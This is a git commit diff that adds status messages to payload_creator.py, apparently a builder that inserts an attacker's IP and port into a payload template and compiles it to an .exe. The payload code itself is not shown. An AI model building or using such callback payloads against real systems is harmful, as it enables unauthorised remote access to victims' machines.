e74540d43b07eba396ec1d060a6dae8bca7cff18
Astr0l <41875791+Astr0l@users.noreply.github.com>
2019-07-16 21:16:02 -0500

    Added verbosity

--- payload_creator.py
+++ payload_creator.py
@@ -1,18 +1,25 @@
 import sys
+import os
 
 if len(sys.argv) != 3:
-    print("[!] Invalid Argument! Usage: python payload_creator.py <IP> <PORT>")
+    print("[-] Invalid Argument! Usage: python payload_creator.py <IP> <PORT>")
     exit()
 
 IP = sys.argv[1]
 PORT = sys.argv[2]
 
+print("[*] Reading template file: payload.py")
+
 with open('payload.py', 'r') as file:
     data = "\r" + file.read()
     file.close()
 
+print("[*] Editing parameters...")
 data = data.replace("42069_", IP).replace("42069", PORT)
 
+print("[*] Writing to temporary file...")
 with open('tempPayload.py', 'w') as tempPayload:
     tempPayload.write(data)
     tempPayload.close()
+
+print("[*] Compiling payload to .exe\n\n\n")
